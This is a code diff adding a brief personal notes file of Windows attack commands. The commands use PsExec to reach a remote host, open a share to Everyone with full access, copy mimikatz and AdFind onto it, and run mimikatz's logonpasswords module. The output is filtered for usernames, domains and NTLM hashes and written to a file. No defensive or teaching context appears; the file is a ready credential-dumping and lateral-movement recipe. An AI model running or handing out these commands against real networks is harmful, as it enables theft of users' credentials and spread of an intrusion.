@@ -1,0 +1,12 @@
+"to remember"
+
+psexec.exe \\Desktop-abcedfg cmd.exe /c "mkdir c:\users\dddolev\exploit &net share ShareName=c:\users\dddolev\exploit /grant:Everyone,FULL "
+
+net use z: \\Desktop-abcedfg\c$\users\dddolev\exploit
+
+cd z:
+
+xcopy c:\users\dddolev\exploit\mimikatz\ z:\ & xcopy c:\users\dddolev\exploit\adfind\ z:\ 
+
+
+c:\users\dddolev\exploit\pstools\psexec.exe \\Desktop-abcedfg powershell -command "<mimikatz new path> log privilege::debug sekurlsa::logonpasswords exit | select-string -pattern '\*\s+(Username|Domain|NTLM)\s+: .*'> c:\users\dddolev\exploit\mimiout.txt"
